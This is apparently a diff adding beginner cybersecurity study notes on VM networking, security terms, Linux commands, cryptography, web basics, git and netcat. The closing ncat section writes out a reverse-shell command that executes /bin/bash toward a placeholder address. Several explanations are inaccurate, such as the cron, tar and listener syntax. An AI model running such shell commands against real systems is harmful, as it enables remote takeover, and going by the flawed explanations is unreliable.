@@ -1,0 +1,301 @@
+Bridged network in VM:
+Means your virtual machine will act as a separate machine. It will have a separate ip address. You can still ping the physical machine where vm is installed , because it is in same subnet.
+
+NAT:
+stands for Network Address Translation. 
+It is a way to convert multiple private ip's into one public ip.
+Eg.Router. All devices connected inside a router will have separate private ip, but when a device sends traffic through router, at that time the private ip is switched to routers public ip only outside the network.
+If we use NAT in vm, then our physical machine will acts as a router for our vm.
+
+Vulnerability refers to a flaw or bug in a software or website.
+Exploit is a way that hackers take advantage of the vulnerability.
+Paylaod is a piece of code that is used to to exploit a bug.
+
+Red Teaming:
+Red team people focuses on offensive pentesting and try to hack into as many systems with the organisation's permission.
+
+Blue Teaming:
+Blue team people focuses on improving security by patching vulnerabilities, updating software and ensure that the security mechanisms were implemented and functioning properly. They are defensive.
+
+Privileges:
+A special functionality that only one person or a group has.
+Priveleges means certain permission of user on certain files and folders.
+Escalating those privileges to root user or Administrator user is called Privilege Escalation.
+
+Denial of Service (DOS):
+Sending a huge number of requests from a system to another computer is called Denial of Service.
+If this attack performed by multiple computers then it is called as Distributed Denial of Service(DDOS)
+This leads to crashing the system.
+
+Buffer Overflow:
+Whenever the application does not handle the input data correctly, data may overflow into memory regions like stack and then the application gets crashed.
+Attacker can control the instruction pointer and runs their own malicious code.
+
+Virus:
+It grows itself and it affects only one system or a computer.
+
+Worm:
+It infects all computers running on that same network. It will create a botnet scenario.
+
+Ransomware:
+It encrypts all the data including files and folders. The user have to pay to recover them.
+-------------------------------------------------------------------------------------------------------
+
+LINUX COMMANDS
+
+sudo updatedb
+locate test.txt
+"Use this command to locate any files"
+
+which python3
+"The above command is used to check if the software is installed"
+
+whatis ls
+"Use this command to find the purpose of the command"
+
+nl test.txt
+"This command will return the no.of lines"
+
+sort test.txt
+"print all contents in alphabetic order"
+
+sort -r test.txt
+"print all contents in reverse alphabetic order"
+
+sort -fu test.txt    or    uniq test.txt
+"Use this command to remove the repeated lines"
+
+-rw-r--r--
+Total 9 bits, leave the first hyphen -
+First 3 bits (rw-) are current user permissions
+Next 3 bits (r--) are current group permissions
+Last 3 bits (r--) are all the other members permission ,except this group.
+
+chown kali:kali test.txt
+"Use the above command to change ownership of the file"
+username:group = kali:kali
+
+umask 002
+"Use this command to change the default permissions for newly created folders" 
+
+suid - Set this to run the file as the owner of the file.
+guid - Set this to run this file as the owner of that group.
+sticky bit - If set, anyone can rwx but can't delete the file.
+
+ls /
+"lib64 and lib directory contains shared objects"
+"mnt" means mount point.It shows the connected pendrives or cd.
+"tmp contains temporary files.After you restart the machine,contents in tmp directory will get deleted"
+"boot contains files required for booting and GRUB bootloader files"
+"etc contains the applications configuration files.All app saved settings will be stored in a config file inside the etc"
+"var contains backup files and ther files"
+
+
+sudo adduser
+"Use this command to add a new user"
+
+sudo deluser kali
+"Use this command to delete an user"
+
+/etc/passwd contains user information
+/etc/shadow conatins user encrypted password and other services information
+env file contains the environment variables
+PATH variable:
+So whenever we run a command, it will check the folders in PATH.
+
+export ip=google.com
+"Use the export command to create an env variable"
+echo $ip 
+"We can print the env variables using $ sign"
+
+export PATH=$PATH:/home/kali/Desktop
+"This command is used to change or modify the env variable's value"
+
+apt-cache search chrome
+"Use this command to search for specific packages in repository, to install it"
+
+dpkg -i chrome.deb
+"Use this command to install debian packages. But dpkg won't install the dependecies, and it will give errors, so you can use gdebi as an alternative"
+
+gdebi chrome.deb
+"Use this command to install debian packages. Dependencies will be automatically installed"
+
+crontab -e 
+"Use this command to set cron jobs"
+*/5 * * * * echo "hi"
+"Above script will run everyday for 5 minutes"
+
+* 6-9 * * * echo "hi"
+"Above script will execute between 6a.m - 9a.m"
+
+service --status-all 
+"Shows all the services"
+
+apt install openssh-server
+service ssh start
+"Use this command to start ssh server"
+
+sudo systemctl enable ssh
+"Use this command to enable any service automatically when system starts"
+
+sudo systemctl disable ssh
+sudo systemctl start ssh
+
+
+zip test.zip /temp
+"Use the above command to zip any folder"
+test.zip is the name you are assigning to the new zip file
+/temp is the folder you are going to compress
+
+unzip test.zip 
+"Use this command to unzip any folder"
+
+tar -cvf test.tar /temp
+"To compress a folder to tar"
+
+tar -xcf test.tar
+"to extract a tar file"
+
+---------------------------------------------------------------------------------------------------------
+
+NETWORK:
+A computer network is a group of devices that follow some communication protocols to sharing resources and for data transfer.
+Network can be wired or wireless
+Advantages:
+*We can share resources between devices
+*We can communicate to devices all over the globe.
+
+
+-----------------------------------------------------------------------------------------------------------
+
+CRYPTOGRAPHY:
+Cryptography is an art of converting plain text to cipher text(gibberish)
+When receiver receives the message then it is converted to plain text.
+Cryptography mainly aims at privacy and integrity.
+It is not the latest technique , its from thousands of years ago.
+But they use some symbols.
+
+Terminology:
+1)Plain text: this is actual message sender wants to send to receiver.
+2)Cipher text: this is unintelligible text and normal person cannot understand.
+3)Encryption: this is the process of converting the plain text to cipher text.
+4)Decryption: this is the process of converting the cipher text to plain text.
+5)Cryptanalysis: study of understanding how algorithms works and finding weaknesses
+6)Cryptanalyst: the person who does cryptanalysis is called cryptanalyst.
+
+Ciphers:
+1)Substitution ciphers: these ciphers replace the plain text characters with some other characters.
+2)Block ciphers: these ciphers operates on some block of bits.
+3)Symmetric encryption: same key is used in both encryption and decryption side.
+4)Asymmetric encryption: Public key is used for encryption and private key is used for decryption.
+5)Digital certificate: these certificates are used to establish a secure connection between sender and receiver.(encrypted) . Eg: SSL certificate.
+
+Old ascii uses 7bits and have 127 characters.
+ASCII uses 8bits. So the column will be 128 to 1.
+There are 256 ASCII characters are there which includes all our keyboard buttons.
+Unicode can go 8bits, 16bits and 32bits.
+
+\0 is null byte and in C it is identified as string terminator.
+So whatever comes after null byte, the application won't take it.
+Eg: aaa\0bcdefg
+The application will only take 'aaa' and ignore all the other characters after \0
+
+Base64:
+base64 have 64 characters which includes A-Z, a-z, 0-9, + , / 
+base64 use 6bits
+
+----------------------------------------------------------------------------------------------------------
+WEB FUNDAMENTALS:
+
+URL stands for Uniform Resource Locator
+Its used to locate particular resource on the server
+In browser we use http protocol to access resource on that web server.
+Resource may be any html,image,pgf,js file etc..
+
+Proxy is like a middle man between you and webserver.
+Every requests and responses go through the proxy.
+proxy can control heavy traffic and can reduce load for webserver.
+proxy can also log client information
+we can edit requests and responses using proxy tools such as burp suite, zap
+
+URL encoding converts character into some format that can be sent over the internet
+URL contains only ASCII characters.
+
+
+Cookies:
+Cookies are the uniques values used to identify the user
+cookies are stored in client side
+cookies contain info like sessionid,timestamp etc.
+server can keep track of user activities using cookies..
+
+First Party Cookies: These cookies are set directly by the webserver.
+Third Party Cookies: These cookies are set by different websites.
+Eg: A site may contain some ads, each ad can set a cookie to keep track of your searches
+Ubuntu allowed amazon from16.04 version to keep track of user searches
+
+Zombie Cookies: These are permanent cookies set by third parties and are hard to remove.
+These are also called flash cookies because they gets stored in adobe flash.
+
+Sessions:
+sessions are unique id stored at the server side.
+these are set to client to identify from then onwards.
+when user logged in, new session id is created.
+when user logged out, corresponding session id is destroyed.
+
+Same Origin Policy:
+According to this, a browser executes scripts only if the request has same protocol, same domain name and same port number.
+
+
+--------------------------------------------------------------------------------------------------------
+Sockets:
+sockets are building blocks for Network programming
+socket is a pair of ip address & port number
+we can communicate with network applications using socket
+many networking modules were built based on sockets. eg.nmap, scapy
+even web modules use sockets in the backend 
+
+-----------------------------------------------------------------------------------------------------
+Git:
+
+In client-server architecture, if the server goes down you can't access our files.
+Whereas in version-control systems you, your teammates and the server will have project files.
+In case server goes down, you can have local copy or else you can clone it from your teammates
+Multiple backups and reverting back to previous versions are the main benefits of Version control systems.
+Git is an version control system.
+
+Github: this is where we store our project files in folders called repositories.
+Gitlab: this is same like github but for personal or private projects.
+Gitbook: this is for documenting your information.Its a digital notebook, you can have some pages to store data in markdown or html.
+
+Working directory/tracking:
+this is where our project files resides. If you modified the data and you want to save then add them to Staging area.
+
+Staging Area: 
+this is where our committed files resides ie)save files. 
+we can now push to repository or can edit further.
+
+------------------------------------------------------------------------------------------------------
+Netcat:
+It is a network tool that uses tcp udp connections to read and write in a network.
+We can't execute commands
+
+nc -nv <ip-address> <port>
+The above command is used to connect to an IP address.
+
+nc -nvlp <ip-address> <port>
+The above command is used to open a port in our network and listen.
+
+-------------------------------------------------------------------------------------
+Ncat:
+It is same as netcat, but uses encryption.
+In ncat we can execute commands in reverse shell.
+
+ncat -nv <ip-address> <port> -e /bin/bash
+The above command is used to connect to an IP address and execute commands.
+
+ncat -nvlp <ip-address> <port>
+The above command is used to open a port in our network and listen.
+
+-e /bin/bash
+The above flag is used to execute commands when using ncat.
+
